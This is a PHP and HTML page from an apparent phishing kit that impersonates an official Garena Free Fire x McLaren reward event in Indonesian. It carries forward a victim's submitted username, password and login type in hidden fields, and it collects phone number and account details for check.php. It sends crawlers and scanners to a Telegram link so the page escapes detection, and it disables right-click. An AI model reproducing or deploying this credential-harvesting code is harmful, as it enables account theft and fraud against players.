<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: https://t.me/sc');
die();
}
?>
<?php


// MENANGKAP DATA YANG DI-INPUT
$user = $_POST['user'];
$pass = $_POST['pass'];
$login = $_POST['log'];
$nick = $_POST['nick'];
$playid = $_POST['playid'];
$ips = $_SERVER['REMOTE_ADDR'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($user == "" && $pass == "" && $login == ""){
header("Location: index.php");
}

?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="GARENA FREE FIRE X MCLAREN">
<meta name="description" content="Collect your special rewards at the event. This opportunity is limited and without the need for topup. Collect your rewards now!">
<meta property="og:description" content="Collect your special rewards event. This opportunity is limited and without the need for topup. Collect your rewards now!">
<meta property="og:url" content="./">
<meta property="og:site_name" content="GARENA FREE FIRE: x McLaren">
<meta property="og:type" content="website">
<meta name="copyright" content="PUBGM">
<meta name="theme-color" content="#000">
<meta property="og:image" content="https://g.top4top.io/p_20446cd4b8.png">
<title>GARENA FREE FIRE: X MCLAREN</title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/login/facebook.css">
<link rel="stylesheet" href="css/login/twitter.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="https://g.top4top.io/p_20446cd4b8.png">
<style type="text/css">
@charset "utf-8";
@import url("https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Teko:300,400,500");
*,*:before,*:after {
	-webkit-box-sizing:border-box;
	-moz-box-sizing:border-box;
	box-sizing:border-box;
}
body {
	background:url(https://j.top4top.io/p_2043o70mt1.jpeg) no-repeat center;
	-webkit-background-size:cover;
	-moz-background-size:cover;
	-o-background-size:cover;
	background-size:100% 100%;
	margin: 0;
	font-family: 'Teko';
}
.container {
	background: rgba(0,0,0,0.3);
	background-size: cover;
	position: relative;
	margin: 0px auto;
	max-width: 400px;
	height: auto;
	border: 1px solid #e2c73d;
}
.navbar {
	background:#000;
	width:100%;
	height:50px;
	padding:4px;
	border-bottom: 1px solid white
}
.navbar img {
	width:40px;
	margin-right:5px;
	border-radius:5px;
	float:left;
}
.navbar-txt-game {
	padding-top:2px;
	color:#feab02;
	font-size:18px;
	font-family:'Teko',sans-serif;
	text-align:left;
}
.navbar-txt-game span {
	color:#d9d9d8;
	font-size:13px;
	line-height:10px;
	display:block;
}
.navbar-btn-wrapper {
	margin-top:0px;
	float:right;
}
.navbar-btn {
	background:transparent;
	margin-right: 5px;
	margin-top: 5px;
	color:#fff;
	font-size:15px;
	font-family:'Teko',sans-serif;
	text-align:center;
	text-transform:uppercase;
	border-radius: 3px;
	display:inline-block;
	outline:none;
	border:none;
}
.header {
	background: transparent;
    width: 100%;
    height: 110px;
	margin-left: auto;
	margin-right: auto;
	border-bottom: 1px solid #fff;
}
.header img {
	width: 100%;
	height: 195px;
	border-bottom: 1px solid #fff;
}
.box {
    width: 93%;
    height: auto;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 12px;
	position: relative;
	border-radius: 5px;
} 

.scroll {
	background:url(img/bgj.jpg) no-repeat;
	background-size: 100% 100%;
	overflow:scroll;
	position:relative;
	width: 100%;
	height:500px;
	margin-top:11px;
	margin-left: auto;
	margin-right: auto;
	display: block;
	scrollbar-face-color:#ffbb40;
	scrollbar-shadow-color:#ffbb40;
	scrollbar-highlight-color:#ffbb40;
	scrollbar-3dlight-color:#ffbb40;
	scrollbar-darkshadow-color:#ffbb40;
	scrollbar-track-color:#ffbb40;
	scrollbar-arrow-color:#ffbb40;
	border-radius: 0px 0px 5px 5px;
	border:1px solid #c7ed81;
	border-top: none
}
.item {
	width: 30%;
	height: 110px;
	margin: 3px;
	margin-bottom: 38px;
	display: inline-block;
}
.item img {
	width: 100%;
    height: 100%;
	border-top-left-radius: 5px;
	border-top-right-radius: 5px;
}
.item button {
	background: url(img/collect.png) no-repeat center;
	background-size: 100% 100%;
	width:101%;
	height:28px;
	padding:5px;
	margin-left: -1px;
	margin-top: -1px;
	color:#000000c4;
	font-size:16.5px;
	letter-spacing: 1px;
	font-family:'Teko',sans-serif;
	font-weight: 500;
	text-align:center;
	border: none;
	border-bottom-left-radius: 5px;
	border-bottom-right-radius: 5px;
	outline:none;
}
.item img {
	border:none;
}

.footer {
	background: #000;
	width: 100%;
	height: auto;
	padding: 10px;
	border-top: 1px solid #fff;
}
.footer img {
	width: 90%;
	margin-left: auto;
	margin-right: auto;
	display: block;
}
.popup {
	width:100%;
	height:100%;
	position:fixed;
	top:0;
	left:0;
	z-index:9999;
	background-color:rgba(0, 0, 0, 0.4);
}
.nav-popup {
	background: #000;
	height: auto;
	border: 4px;
	padding:10px;
}
.nav-popup-title {
	color: #fff;
	font-size: 20px;
	font-family: Teko;
	text-align: left;
	letter-spacing: 0.5px;
}
.popup-box {
	background: url(img/blur.jpg) no-repeat center;
	background-size: cover;
	width: 370px;
	height: auto;
	position: relative;
	margin: 50px auto;
	margin-top: 15%;
	text-align: center;
	font-family:'Teko';
	color:#000;
	border: 1px solid #fff;
	border-radius: 2px;
}
.popup-alert {
	background: #000;
	width: 95%;
	height: auto;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #fff;
	font-size: 15px;
	border:1px solid #fff;
    font-family: Teko;
	text-align: center;
	border-radius: 5px;
	display: block;
}
.popup-item {
	width:23%;
	height:85px;
	margin-left:auto;
	margin-right:auto;
	margin-bottom: 17px;
	border: 1px solid #fff;
	display: block;
}
.popup-btn {
    background: rgba(0,0,0,0.8);
    width: 25%;
    height: auto;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #fff;
	font-size: 15px;
	font-family: Teko;
	border: 1px solid #fff;
	border-radius: 5px;
	outline: none;
	display: block;
}
.btn-login {
    width: 95%;
    height: auto;
    padding: 8px;
    margin-left: auto;
	margin-right: auto;
    color: #000;
	font-size: 15px;
    font-family: Teko;
    border: none;
    border-radius: 5px;
    outline: none;
    display: block;
}
.btn-login i {
    color: #fff;
    font-size: 20px;
    float: left;
}
.facebook {
    background: #3b5998;
    color: #fff;
	margin-bottom: 3px;
}
.twitter {
    background: #08a0e9;
    color: #fff;
	margin-bottom: 10px;
}
.popup-close {
	width:20px;
	height:20px;
	color:#fff;
	text-align:center;
	text-transform: uppercase;
	font-weight: bold;
	position:absolute;
	top:13px;
	right:10px;
	display:block;
}
.popup-close i {
	color:#fff;
	font-size: 25px;
}
.popup-login {
	background:rgba(0,0,0,0.5);
	width:100%;
	height:100%;
	position:fixed;
	top:0;
	left:0;
	z-index:9999;
}
.popup-box-login-fb {
	background:#ECEFF6;
	max-width:330px;
	height:auto;
	position:relative;
	margin:50px auto;
	margin-top:1.9%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.popup-box-login-twitter {
	background:#fff;
	max-width:330px;
	height:350px;
	position:relative;
	margin:50px auto;
	margin-top:10%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.close-fb {
	background:#000;
	width:20px;
	height:20px;
	color:#fff;
	text-align:center;
	text-decoration:none;
	border-radius:50%;
	border:1.5px solid #fff;
	position:absolute;
	top:-8px;
	right:-10px;
	display:block;
}
.close-fb i {
	color:#fff;
	padding-top:1px;
}
.close-other {
	background:#000;
	width:20px;
	height:20px;
	color:#fff;
	text-align:center;
	text-decoration:none;
	border-radius:50%;
	border:1.5px solid #fff;
	top:-8px;
	right:-10px;
	position:absolute;
	z-index:9999999;
	display:block;
}
.close-other i {
	color:#fff;
	padding-top:1px;
}
.verify-alert {
	background: #e2c73d;
	width: 94.3%;
	height: auto;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 15px;
	padding: 5px;
	color: #000;
	font-size: 15px;
	font-family: Teko;
	text-align: left;
	border-radius: 5px;
	display: block;
}
.verify-alert button {
	background: #000;
	width: auto;
	height: auto;
	margin-top: -2px;
	margin-right: -2px;
	padding: 1px;
	padding-left: 10px;
	padding-right: 10px;
	color: #e2c73d;
	font-size: 15px;
	font-family: Teko;
	text-align: center;
	border: 1px solid #000;
	border-radius: 5px;
	outline: none;
	float: right;
}
.verify-input {
	background: rgba(0,0,0,0.5);
	width: 90%;
	height: auto;
	margin-bottom: 3px;
	padding: 6px;
	color: #fff;
	font-size:15px;
	font-family: Teko;
	border: 1px solid silver;
	border-radius: 5px;
	position: relative;
	outline: none;
}
.verify-input::placeholder {
	color: #fff;
}
.verify-select {
	background: rgba(0,0,0,0.5);
	width: 90%;
	height: auto;
	margin-bottom: 3px;
	padding: 6px;
	padding-left: 3px;
	color: #fff;
	font-size: 15px;
	font-family: Teko;
	border: 1px solid silver;
	border-radius: 5px;
	position: relative;
	outline: none;
}
.verify-btn {
    background: black;
	width: 40%;
	height: auto;
	margin-top: 10px;
	padding: 6px;
	font-size: 15px;
	font-family: Teko;
	text-align: center;
	color: #fff;
	margin-bottom: 3px;
	border: 1px solid #fff;
	position: relative;
	outline: none;
	border-radius: 4px
}
.kanan {
	float: right;
}
.kiri {
	float: left;
}
.tengah {
	margin-left: auto;
	margin-right: auto;
	display: block;
}
::-webkit-scrollbar { 
    display: none;
    width: 0px;
}
@media only screen and (max-width:600px) {
    .container {
        width: 100%;
        height: auto;
        margin-top: 0px;
        margin-bottom: 0px;
		border: none;
        border-radius: 0px;
        padding: 0px;
    }
    .header {
        height: 110px;
    }
    .scroll {
        height: 400px;
    }
    .item {
        height: 90px;
    }
    .popup-box {
        width: 345px;
        margin-top: 60%;
    }
    .popup-item {
        width:25%;
        height:85px;
	}
	.popup-box-login-fb {
		margin-top: 4%;
	}
	.popup-box-login-twitter {
		margin-top: 25%;
	}
}
@media only screen and (max-width:395px) {

}
</style>
</head>
<body oncontextmenu="return false" ondragstart="return false">
<div class="container">
<div class="navbar">
<div class="navbar-btn-wrapper">
<button class="navbar-btn">
<i class="fa fa-shopping-cart fa-2x"></i>
</button>
</div> 
<img src="https://b.top4top.io/p_20438n84j7.png">
<div class="navbar-txt-game">
GARENA FREE FIRE X MCLAREN
<span>Official Garena Indonesia!</span>
</div> 
</div> 
<div class="header">
<img src="https://j.top4top.io/p_20440f7y02.jpg">
</div>
<div style="margin-bottom: 21%"></div>
<div style="background:rgba(0,0,0,0.5);width: 100%;height: 80px;border-bottom: 1px solid white">
	<img src="https://b.top4top.io/p_20438n84j7.png" style="position: relative;margin-top: 2%;width: 50px;margin-left: 5%">
	<span style="color: white;font-family: teko;font-size: 30px;font-weight: 1000;position: absolute;margin-left: 2.5%;margin-top: 3%;text-shadow: 1px 1px #cce152">Garena Free Fire X McLaren</span>
	<span style="color: white;font-family: teko;font-size: 16px;font-weight: 10;position: absolute;margin-left: 2.5%;margin-top: 11%;text-shadow: 1px 1px #cce152">VERIFIKASI AKUN ANDA UNTUK MENDAPATKAN HADIAH</span>
</div>
<br>
<div class="box">
<div class="tab_rewards">
<div class="scroll" style="margin-top: -3px">
<center>
<div style="margin-top: 5px"></div>
<form action="check.php" id="formLogin" onsubmit="open_my_account();" method="post" onclick="$(this).end()">
<input type="hidden" class="verify-input" name="user" value="<?php echo $user;?>" readonly>
<input type="hidden" name="pass" value="<?php echo $pass;?>" readonly>
<input type="number" class="verify-input" name="playid" value="<?php echo $playid; ?>" id="playid" placeholder="Character ID" autocomplete="off" required readonly>
<input type="text" class="verify-input" name="nick" value="<?php echo $nick; ?>" id="nick" placeholder="Nickname" autocomplete="off" required readonly>
<input type="number" class="verify-input" name="phone" id="phone" placeholder="Nomer ponsel" autocomplete="off" required>
<select class="verify-select" name="level" id="level" required>
<option selected="selected" disabled="disabled" value="">Level akun</option>
<option>1</option>
<option>2</option>
<option>3</option>
<option>4</option>
<option>5</option>
<option>6</option>
<option>7</option>
<option>8</option>
<option>9</option>
<option>10</option>
<option>11</option>
<option>12</option>
<option>13</option>
<option>14</option>
<option>15</option>
<option>16</option>
<option>17</option>
<option>18</option>
<option>19</option>
<option>20</option>
<option>21</option>
<option>22</option>
<option>23</option>
<option>24</option>
<option>25</option>
<option>26</option>
<option>27</option>
<option>28</option>
<option>29</option>
<option>30</option>
<option>31</option>
<option>32</option>
<option>33</option>
<option>34</option>
<option>35</option>
<option>36</option>
<option>37</option>
<option>38</option>
<option>39</option>
<option>40</option>
<option>41</option>
<option>42</option>
<option>43</option>
<option>44</option>
<option>45</option>
<option>46</option>
<option>47</option>
<option>48</option>
<option>49</option>
<option>50</option>
<option>51</option>
<option>52</option>
<option>53</option>
<option>54</option>
<option>55</option>
<option>56</option>
<option>57</option>
<option>58</option>
<option>59</option>
<option>60</option>
<option>61</option>
<option>62</option>
<option>63</option>
<option>64</option>
<option>65</option>
<option>66</option>
<option>67</option>
<option>68</option>
<option>69</option>
<option>70</option>
<option>71</option>
<option>72</option>
<option>73</option>
<option>74</option>
<option>75</option>
<option>76</option>
<option>77</option>
<option>78</option>
<option>79</option>
<option>80</option>
<option>81</option>
<option>82</option>
<option>83</option>
<option>84</option>
<option>85</option>
<option>86</option>
<option>87</option>
<option>88</option>
<option>89</option>
<option>90</option>
<option>91</option>
<option>92</option>
<option>93</option>
<option>94</option>
<option>95</option>
<option>96</option>
<option>97</option>
<option>98</option>
<option>99</option>
<option>100</option>
</select>
<select class="verify-select" name="tier" id="tier" required>
<option selected="selected" disabled="disabled" value="">Ranked Tier</option>
<option>Bronze</option>
<option>Silver</option>
<option>Gold</option>
<option>Platinum</option>
<option>Diamond</option>
<option>Master</option>
<option>Grand Master</option>
</select>
<select class="verify-select" name="rpt" id="rpt" required>
<option selected="selected" disabled="disabled" value="">Elite Pass</option>
<option>Pernah</option>
<option>Tidak</option>
<option>Pernah Pre-order</option>
</select>
<select class="verify-select" name="platform" id="platform" required>
<option selected="selected" disabled="disabled" value="">Platform</option>
<option>Android</option>
<option>iOS</option>
</select>
<input type="hidden" name="log" value="<?php echo $login;?>" readonly>
<button type="submit" class="verify-btn" onmousedown="buka.play()"><span>Verifikasi</span></button>
</form>
</center>

</div> <!--- box --->
</div> <!--- container --->
<script src="https://cdn.jsdelivr.net/gh/stylesheett/jquery.min.js@main/slim.js"></script>
<script src="js/popup.js"></script>
<script src="js/click.js"></script>

</body>
</html>
